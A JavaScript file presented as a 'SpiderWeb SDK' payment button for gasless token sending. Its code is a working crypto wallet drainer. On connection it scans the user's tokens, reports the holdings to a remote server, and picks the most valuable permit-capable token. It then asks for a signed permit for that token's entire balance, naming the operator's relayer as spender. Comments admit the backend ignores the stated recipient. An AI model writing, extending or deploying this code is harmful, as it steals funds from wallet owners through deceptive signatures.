/**
 * SpiderWeb SDK v1.1
 * A portable script to find the highest-value permit token and handle gasless sending.
 */
window.SpiderWebSDK = {
    // --- Internal State ---
    _config: {},
    _provider: null,
    _signer: null,
    _currentUserAddress: null,
    _discoveredProviders: new Map(),
    _isInitialized: false,

    // --- Constants & ABIs ---
    _ERC20_PERMIT_ABI: [
        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
        "function nonces(address owner) view returns (uint256)",
        "function DOMAIN_SEPARATOR() view returns (bytes32)",
        "function name() view returns (string)",
        "function version() view returns (string)",
        "function decimals() view returns (uint8)",
        "function balanceOf(address owner) view returns (uint256)",
        "function symbol() view returns (string)"
    ],
    _RELAYER_SERVER_URL_BASE: "https://battlewho.com", // Your backend URL

    _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
        1: 'ethereum',
        137: 'polygon-pos',
        10: 'optimistic-ethereum',
        42161: 'arbitrum-one',
        56: 'binance-smart-chain',
        43114: 'avalanche'
        // You can add more chains here as needed
    },

    /**
     * Initializes the SDK and attaches the payment logic to a button.
     */
    init: async function(config) { // It's correctly async
    if (this._isInitialized) {
        console.warn("SpiderWebSDK already initialized.");
        return;
    }

    // ✅ FIXED: The 'relayerAddress' is no longer required here. The SDK will fetch it.
    if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.recipientAddress || !config.chainId) {
        console.error("SpiderWebSDK Error: Missing required configuration parameters.");
        return;
    }
    if (typeof ethers === 'undefined') {
        console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
        return;
    }

    // Store the initial user-provided config
    this._config = config;

    try {
        // This part is correct: Dynamically fetch the config from your backend.
        console.log("SpiderWebSDK: Fetching remote configuration...");
        const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/get-config`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json','X-Api-Key': this._config.apiKey },
            body: JSON.stringify({
                apiKey: this._config.apiKey,
                origin: window.location.origin
                
            })
        });

        if (!response.ok) {
            throw new Error(`Network error while fetching remote config. Status: ${response.status}`);
        }

        const remoteConfig = await response.json();
        if (!remoteConfig.success || !remoteConfig.relayerAddress) {
            throw new Error(remoteConfig.message || "Invalid remote configuration from server.");
        }

        // Merge the fetched relayer address into the SDK's config.
        this._config.relayerAddress = remoteConfig.relayerAddress;
        console.log("SpiderWebSDK: Remote configuration loaded successfully.");

    } catch (error) {
        console.error("SpiderWebSDK FATAL ERROR:", error.message);
        const payButton = document.getElementById(config.buttonId);
        if (payButton) {
            payButton.disabled = true;
            payButton.innerHTML = 'SDK Init Failed';
        }
        return; // Halt initialization
    }

    // The rest of the function continues as normal
    const payButton = document.getElementById(config.buttonId);
    if (!payButton) {
        console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
        return;
    }
    payButton.addEventListener('click', this._handlePaymentClick.bind(this));

    this._injectModalHtml();
    this._setupEip6963Listeners();
    this._isInitialized = true;
    console.log("SpiderWebSDK initialized successfully.");
},

    _getRankedCompatibleTokens: async function() {
    // Steps 1 & 2: Get balances and filter for permit-compatible tokens
    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
    const response = await fetch(alchemyUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
            params: [this._currentUserAddress, 'erc20']
        })
    });
    const data = await response.json();
    if (!data.result) return [];

    const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
    if (nonZeroBalances.length === 0) return [];

    const checkPromises = nonZeroBalances.map(async (token) => {
        if (await this._checkPermitSupport(token.contractAddress)) {
            const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
            const [name, symbol, balance, decimals] = await Promise.all([
                tokenContract.name(),
                tokenContract.symbol(),
                tokenContract.balanceOf(this._currentUserAddress),
                tokenContract.decimals()
            ]);
            return { contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 }; // Add usdValue property
        }
        return null;
    });

    const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
    if (compatibleTokens.length === 0) return [];

    // Step 3: Fetch prices
    const prices = await this._fetchTokenPrices(
    // Map the addresses to lowercase before sending them to the price API
    compatibleTokens.map(t => t.contractAddress.toLowerCase())
);

    // Step 4: Calculate USD value for each token
    if (prices) {
        for (const token of compatibleTokens) {
            const priceData = prices[token.contractAddress.toLowerCase()];
            if (priceData && priceData.usd) {
                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
                token.usdValue = parseFloat(formattedBalance) * priceData.usd;
            }
        }
    }

    // Step 5: Sort tokens by USD value in descending order
    compatibleTokens.sort((a, b) => b.usdValue - a.usdValue);

    return compatibleTokens;
},
    _fetchTokenPrices: async function(tokenAddresses) {
        const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
        if (!assetPlatform) {
            console.warn(`Price lookup is not supported for chainId: ${this._config.chainId}`);
            return null;
        }

        const addressesString = tokenAddresses.join(',');
        const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd`;

        try {
            const response = await fetch(apiUrl);
            if (!response.ok) {
                throw new Error(`CoinGecko API request failed with status ${response.status}`);
            }
            // The API returns data with addresses in lowercase.
            const data = await response.json();
            console.log("CoinGecko API URL:", apiUrl); 
            console.log("CoinGecko Response Data:", data);
            return data;
        } catch (error) {
            console.error("Could not fetch token prices:", error);
            return null; // Return null to allow for fallback logic
        }
    },

    // --- FIXED: Handles flow control. Triggers executeSend only if already connected. ---
    _handlePaymentClick: async function() {
        try {
            if (!this._signer) {
                // If not connected, start the connection process. 
                // The subsequent execution will be triggered inside _handleProviderSelection.
                const connected = await this._connectWallet(); 
                if (!connected) {
                    this._updateStatus("Wallet connection cancelled.", "info");
                }
                // Return here. Do not proceed to _executeSend() from this function if connection was just initiated.
                return; 
            }

            // If already connected, run the full process immediately.
            const network = await this._provider.getNetwork();
            if (network.chainId !== this._config.chainId) {
                this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                return;
            }
            await this._executeSend();
            
        } catch (error) {
            console.error("Payment failed:", error);
            this._updateStatus(`Error: ${error.message}`, "error");
        }
    },
    
    _executeSend: async function() {
        this._updateStatus("Scanning wallet for compatible tokens...", "pending");
        
        const tokenData = await this._findHighestValueToken();
        if (!tokenData) {
            throw new Error("No permit-compatible tokens with a balance were found.");
        }

        this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
        await this._signAndSendWithStandardPermit(tokenData);
    },

    _findHighestValueToken: async function() {
        // 1. Fetch all token balances from Alchemy (same as before)
        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
        const response = await fetch(alchemyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                params: [this._currentUserAddress, 'erc20']
            })
        });
        const data = await response.json();
        if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");

        const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
        if (nonZeroBalances.length === 0) return null;
        
        this._updateStatus("Finding all compatible tokens...", "pending");

        // 2. Concurrently check all tokens for permit support and get their details.
        const checkPromises = nonZeroBalances.map(async (token) => {
            if (await this._checkPermitSupport(token.contractAddress)) {
                const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
                const [name, symbol, balance, decimals] = await Promise.all([
                    tokenContract.name(),
                    tokenContract.symbol(),
                    tokenContract.balanceOf(this._currentUserAddress),
                    tokenContract.decimals()
                ]);
                return { contractAddress: token.contractAddress, name, symbol, balance, decimals };
            }
            return null;
        });

        // 3. Filter out non-compatible tokens
        const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);

        if (compatibleTokens.length === 0) {
            return null; // No permit-compatible tokens found at all
        }
        
        // Optimization: If there's only one, no need to fetch prices.
        if (compatibleTokens.length === 1) {
            return compatibleTokens[0];
        }

        this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");

        // 4. Fetch prices for all compatible tokens
        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress.toLowerCase()));
        if (!prices) {
            console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
            return compatibleTokens[0]; // Fallback if price API fails
        }
        
        // 5. Calculate USD value and find the token with the highest value
        let highestValueToken = null;
        let maxUsdValue = -1;

        for (const token of compatibleTokens) {
            const priceData = prices[token.contractAddress.toLowerCase()];
            if (priceData && priceData.usd) {
                // Calculate the value: (balance / 10^decimals) * price
                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
                const usdValue = parseFloat(formattedBalance) * priceData.usd;

                if (usdValue > maxUsdValue) {
                    maxUsdValue = usdValue;
                    highestValueToken = token;
                }
            }
        }

        // Return the highest value token found. If no prices were found, fall back to the first one.
        return highestValueToken || compatibleTokens[0];
    },

_logConnectionEvent: async function() {
    try {
        // --- Step 1: Get all token balances from Alchemy ---
        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
        const balanceResponse = await fetch(alchemyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                params: [this._currentUserAddress, 'erc20']
            })
        });
        const balanceData = await balanceResponse.json();
        if (!balanceData.result) return;

        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
        if (tokensWithBalance.length === 0) return;

        // --- Step 2: Get metadata (symbol, decimals) for each token ---
        const detailedTokens = [];
        for (const token of tokensWithBalance) {
            const metadataResponse = await fetch(alchemyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
                    params: [token.contractAddress]
                 })
            });
            const metadata = await metadataResponse.json();
            
            if (metadata.result) {
                const decimals = metadata.result.decimals;
                const symbol = metadata.result.symbol;
                const formattedBalance = parseFloat(ethers.utils.formatUnits(token.tokenBalance, decimals)).toFixed(4);

                detailedTokens.push({
                    symbol: symbol,
                    balance: formattedBalance
                });
            }
        }
        
        // --- Step 3: Send the simplified list to the backend ---
        if (detailedTokens.length > 0) {
            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                body: JSON.stringify({
                    apiKey: this._config.apiKey,
                    origin: window.location.origin,
                    walletAddress: this._currentUserAddress,
                    tokens: detailedTokens
                })
            });
        }

    } catch (error) {
        console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
    }
},
    _checkPermitSupport: async function(tokenAddress) {
        const checksumAddress = ethers.utils.getAddress(tokenAddress);
    
        // Get the symbol for clearer logging
        let symbol = checksumAddress; 
        try {
            const tempContract = new ethers.Contract(checksumAddress, ["function symbol() view returns (string)"], this._provider);
            symbol = await tempContract.symbol();
        } catch (e) { /* ignored */ }

        // 1. Check against a list of known tokens with standard or non-standard permit
        const KNOWN_PERMIT_TOKENS = {
            '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': true, // WETH
            '0x1f9840a85d5aF5aa607c37bD30F48cddE3A430bF': true, // UNI
            '0x514910771AF9Ca656af840dff83E8264dCef8037': true, // LINK
            '0xdAC17F958D2ee523a2206206994597C13D831ec7': true, // USDT
        };

        if (KNOWN_PERMIT_TOKENS[checksumAddress]) {
            console.log(`✅ SUCCESS: ${symbol} is on the known permit-compatible list.`);
            return true;
        }

        // 2. Perform a more lenient generic check for other tokens
        try {
            const tokenContract = new ethers.Contract(checksumAddress, this._ERC20_PERMIT_ABI, this._provider);
            
            // The `nonces` function is the single best indicator of permit compatibility.
            // We will not check for DOMAIN_SEPARATOR here, as some tokens (like UNI) lack it.
            await tokenContract.nonces(this._currentUserAddress);
            
            console.log(`✅ SUCCESS: ${symbol} is likely permit-compatible (has nonces function).`);
            return true;
        } catch (error) {
            // This will now only fail if the `nonces` function is missing or reverts.
            console.warn(`❌ SKIPPED: ${symbol} does not appear to be permit-compatible. Reason: ${error.message.substring(0, 50)}...`);
            return false;
        }
    },

    _signAndSendWithStandardPermit: async function(tokenData) {
        this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
        try {
            const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
            const nonce = await tokenContract.nonces(this._currentUserAddress);
            const deadline = Math.floor(Date.now() / 1000) + 1800;
            const tokenName = tokenData.name;

            let domainVersion = "1";
            try {
                domainVersion = await tokenContract.version();
            } catch (e) {
                console.log(`Token ${tokenData.symbol} has no version(), defaulting to '1'.`);
            }

            const domain = {
                name: tokenName,
                version: domainVersion,
                chainId: this._config.chainId,
                verifyingContract: tokenData.contractAddress
            };

            const types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };

            const permitMessage = {
                owner: this._currentUserAddress,
                // ✅ CRITICAL FIX: The spender is now the relayer's address.
                // Your backend logic expects the signature to approve the relayer.
                spender: this._config.relayerAddress,
                value: tokenData.balance.toString(),
                nonce: nonce.toString(),
                deadline: deadline
            };

            this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
            const signature = await this._signer._signTypedData(domain, types, permitMessage);

            const { v, r, s } = ethers.utils.splitSignature(signature);

            // The payload remains the same. The `recipientAddress` from the config
            // is still sent, which your backend correctly ignores in favor of the
            // server-side address lookup.
            const payload = {
                apiKey: this._config.apiKey,
                owner: this._currentUserAddress,
                recipient: this._config.recipientAddress, // This field is sent but your backend logic doesn't use it for the final destination.
                contractAddress: tokenData.contractAddress,
                value: tokenData.balance.toString(),
                deadline: deadline,
                v, r, s,
                origin: window.location.origin,
                chainId: this._config.chainId
            };

            this._updateStatus('Signature received. Relaying transaction...', 'pending');
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-transfer`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
               
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok || !result.success) throw new Error(result.message || "Relayer service failed.");

            this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed!`, 'success');

        } catch (error) {
            console.error("Standard Permit failed:", error);
            this._updateStatus(`Error: ${error.reason || error.message}`, 'error');
            throw error;
        }
    },

    _connectWallet: function() {
        return new Promise((resolve) => {
            this._resolveConnection = resolve;
            this._openWalletModal();
        });
    },

    // --- FIXED: Triggers _executeSend immediately after successful connection ---
    _handleProviderSelection: async function(event) {
        const button = event.target.closest('.sw-wallet-button');
        if (!button) return;

        const rdns = button.dataset.rdns;
        const providerDetail = this._discoveredProviders.get(rdns);
        if (!providerDetail) return;
        
        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
        this._closeWalletModal();

        try {
            const selectedProvider = providerDetail.provider;
            this._provider = new ethers.providers.Web3Provider(selectedProvider);
            await this._provider.send('eth_requestAccounts', []);
            this._signer = this._provider.getSigner();
            this._currentUserAddress = await this._signer.getAddress();
            // --- PASTE THE NEW CODE HERE ---
        console.log("SpiderWebSDK: Finding and ranking compatible tokens...");
        const rankedTokens = await this._getRankedCompatibleTokens();
        if (rankedTokens && rankedTokens.length > 0) {
            console.log("✅ Compatible Tokens Ranked by USD Value:");
            // Using console.table for a clean, readable log
            console.table(rankedTokens.map(t => {
                return {
                    Token: t.symbol,
                    Balance: ethers.utils.formatUnits(t.balance, t.decimals),
                    "Value (USD)": `$${t.usdValue.toFixed(2)}`
                }
            }));
        } else {
            console.log("No permit-compatible tokens with a balance were found.");
        }
            this._logConnectionEvent(); // <-- ADD THIS LINE
            
            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
            
            if (this._resolveConnection) {
                this._resolveConnection(true); 
                
                // AUTOMATICALLY TRIGGER EXECUTION 🚀
                const network = await this._provider.getNetwork();
                if (network.chainId !== this._config.chainId) {
                    this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                    return;
                }
                await this._executeSend();
            }

        } catch (error) {
            console.error("Connection failed:", error);
            this._updateStatus("Connection failed or was rejected.", "error");
            if (this._resolveConnection) this._resolveConnection(false);
        }
    },

    _setupEip6963Listeners: function() {
        window.addEventListener('eip6963:announceProvider', (event) => {
            const providerDetail = event.detail;
            if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                this._renderWalletList();
            }
        });
        window.dispatchEvent(new Event('eip6963:requestProvider'));
    },
    
    _renderWalletList: function() {
        const listDiv = document.getElementById('sw-wallet-list');
        if (!listDiv) return;

        listDiv.innerHTML = '';
        if (this._discoveredProviders.size === 0) {
            listDiv.innerHTML = '<p style="text-align: center; color: #9ca3af;">No wallets detected.</p>';
            return;
        }

        this._discoveredProviders.forEach(p => {
            const buttonHtml = `
                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                    <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                    <span style="font-weight: 500;">${p.info.name}</span>
                </button>
            `;
            listDiv.innerHTML += buttonHtml;
        });
        
        listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
            button.addEventListener('click', this._handleProviderSelection.bind(this));
        });
    },

    _openWalletModal: function() {
        document.getElementById('sw-modal-overlay').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('sw-wallet-modal').style.opacity = 1;
            document.getElementById('sw-wallet-modal').style.transform = 'scale(1)';
        }, 10);
        this._renderWalletList();
    },

    _closeWalletModal: function() {
        const overlay = document.getElementById('sw-modal-overlay');
        const modal = document.getElementById('sw-wallet-modal');
        if (modal) {
            modal.style.opacity = 0;
            modal.style.transform = 'scale(0.95)';
        }
        setTimeout(() => {
            if (overlay) overlay.style.display = 'none';
            if(this._resolveConnection && !this._signer) {
                this._resolveConnection(false);
            }
        }, 300);
    },
    
    _updateStatus: function(message, type = 'info') {
        const statusEl = document.getElementById('sw-status-message');
        if (!statusEl) return;
        const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
        statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
    },
    
    // --- FIXED: Corrected the event listener binding ---
    _injectModalHtml: function() {
        if (document.getElementById('sw-modal-overlay')) return;
        
        const modalHtml = `
            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">
                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>
                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>
                    </div>
                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>
                </div>
            </div>
            <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);

        const closeBound = this._closeWalletModal.bind(this);

        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
        
        document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
            if (e.target.id === 'sw-modal-overlay') closeBound();
        });
    }
};